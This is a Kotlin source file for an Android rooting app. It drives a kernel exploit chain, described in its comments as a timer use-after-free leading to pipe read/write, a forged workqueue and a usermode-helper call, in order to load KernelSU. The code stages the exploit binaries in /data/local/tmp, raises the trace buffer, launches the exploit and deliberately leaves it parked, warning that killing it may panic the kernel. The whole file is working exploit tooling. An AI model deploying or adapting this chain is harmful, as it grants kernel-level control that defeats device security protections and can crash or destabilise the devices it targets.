package cn.nanoturtle.rootmys9280.manager.rootmy

import android.content.Context
import android.os.Process
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Shizuku UserService：在 shell 进程里跑 CVE-2026-98260 的 SamTimer 链路。
 *
 * 与之前用 shellExecutor.exec() 从 App 进程起的差别（也是原版 SamTimer 的做法）：
 * UserService 是一个**常驻进程**，exploit 是它的子进程；App 切到后台/打开管理器
 * 不会带走它，parked 的 libtimer 不会因为会话回收而被杀（那会导致内核页提前释放、
 * 过一会卡死/重启）。
 *
 * 流程（照搬 fork v1.3 的 RootService）：
 *  1. 暂存 libtimer / uhexec / umh_action.sh / ksud(32601) 到 /data/local/tmp
 *  2. 抬高 tracefs buffer
 *  3. libtimer umhpipe：timer UAF → pipe 读写 → 伪造 workqueue → UMH → uhexec
 *     → bind-mount KDP 补丁版 ksud → late-load（KSU 在这一步自己起来）
 *  4. 成功后 exploit 保持 parked（它拿着页，不能强杀）；重启是唯一清理方式
 */
class SamTimerUserService(private val context: Context) : IRootService.Stub() {

    private val running = AtomicBoolean(false)

    /** 用哪份 ksud 做 late-load：3.3.0(32601 多 KMI，会重启管理器) / 3.2.5(原版，行为最稳)。 */
    @Volatile private var ksudAssetName: String = ASSET_KSUD_32601

    companion object {
        private const val WORK_DIR = "/data/local/tmp/w"
        private const val KSUD_STAGE_PATH = "/data/local/tmp/.ksud-stage"
        private const val TRACE_BUF = "/sys/kernel/tracing/buffer_size_kb"
        private const val WAIT_SEC = 300L

        private const val ASSET_PREFIX = "samtimer/"
        private const val ASSET_LIBTIMER = ASSET_PREFIX + "libtimer"
        private const val ASSET_UHEXEC = ASSET_PREFIX + "uhexec"
        private const val ASSET_ACTION = ASSET_PREFIX + "umh_action.sh"
        private const val ASSET_KSUD_32601 = ASSET_PREFIX + "ksud-32601"
        private const val ASSET_KSUD_32525 = ASSET_PREFIX + "ksud-32525"
    }

    override fun isReady(): Boolean {
        val uid = Process.myUid()
        return uid == 2000 || uid == 0
    }

    override fun isRooted(): Boolean = moduleLive()

    override fun destroy() {}

    override fun setKsudAsset(name: String) {
        if (name == ASSET_KSUD_32601 || name == ASSET_KSUD_32525) {
            ksudAssetName = name
        }
    }

    private fun moduleLive(): Boolean = try {
        File("/proc/modules").useLines { lines ->
            lines.any { it.startsWith("kernelsu ") }
        }
    } catch (_: Exception) {
        false
    }

    override fun runExploit(callback: IRootCallback?) {
        if (callback == null) return
        if (!running.compareAndSet(false, true)) {
            callback.onLog("error: another run is already in progress")
            callback.onComplete(1, false)
            return
        }
        Thread({
            var rc = 1
            var ok = false
            try {
                rc = runChain(callback)
                ok = rc == 0
            } catch (e: Exception) {
                runCatching { callback.onLog("error: ${e.message}") }
            } finally {
                runCatching { callback.onComplete(rc, ok) }
                running.set(false)
            }
        }, "samtimer-runner").start()
    }

    private fun log(callback: IRootCallback, line: String) {
        runCatching { callback.onLog(line) }
    }

    private fun stageAsset(name: String, dest: File): Boolean = try {
        dest.parentFile?.mkdirs()
        if (dest.exists()) dest.delete()
        context.assets.open(name).use { input ->
            dest.outputStream().use { output -> input.copyTo(output) }
        }
        dest.setReadable(true, false)
        dest.setExecutable(true, false)
        true
    } catch (_: Exception) {
        false
    }

    private fun runChain(callback: IRootCallback): Int {
        val uid = Process.myUid()
        if (uid != 2000 && uid != 0) {
            log(callback, "error: not running as shell/root (uid=$uid)")
            return 1
        }
        log(callback, "shell context ok (uid=$uid)")

        if (moduleLive()) {
            log(callback, "KernelSU module already live")
            return 0
        }

        val workDir = File(WORK_DIR)
        if (!(workDir.isDirectory || workDir.mkdirs())) {
            log(callback, "error: cannot create $WORK_DIR")
            return 1
        }
        val timerBin = File(workDir, "libtimer")
        val uhexec = File(workDir, "uhexec")
        val action = File(workDir, "umh_action.sh")
        val ksud = File("/data/local/tmp/ksud-s25u-kdp")
        val stage = File(KSUD_STAGE_PATH)

        if (!stageAsset(ASSET_LIBTIMER, timerBin) ||
            !stageAsset(ASSET_UHEXEC, uhexec) ||
            !stageAsset(ASSET_ACTION, action) ||
            !stageAsset(ksudAssetName, ksud) ||
            !stageAsset(ksudAssetName, stage)
        ) {
            log(callback, "error: failed to stage embedded files")
            return 1
        }
        log(callback, "staged libtimer=${timerBin.length()} uhexec=${uhexec.length()} action=${action.length()} ksud=${ksud.length()}")
        log(callback, "staged $KSUD_STAGE_PATH")

        try {
            File(TRACE_BUF).writeText("65536\n")
            log(callback, "trace buffer set to 65536kB")
        } catch (e: Exception) {
            log(callback, "warn: trace buffer write failed (${e.message})")
        }

        log(callback, "starting exploit (umhpipe)...")
        val proc = ProcessBuilder(timerBin.absolutePath, "umhpipe")
            .directory(workDir)
            .redirectErrorStream(true)
            .start()

        val tail = Thread({
            try {
                proc.inputStream.bufferedReader().useLines { lines ->
                    for (line in lines) log(callback, line)
                }
            } catch (_: Exception) {
            }
        }, "samtimer-tail")
        tail.isDaemon = true
        tail.start()

        val deadline = System.currentTimeMillis() + WAIT_SEC * 1000
        while (System.currentTimeMillis() < deadline) {
            if (moduleLive()) {
                log(callback, "KERNELSU_LIVE")
                log(callback, "success; exploit left parked (do not force-stop)")
                return 0
            }
            Thread.sleep(1000)
        }

        // 不杀 exploit：它可能拿着伪造页和 zombie 链；杀掉可能 panic。重启是唯一清理方式。
        log(callback, "error: KernelSU did not appear within ${WAIT_SEC}s (exploit left parked)")
        return 4
    }
}
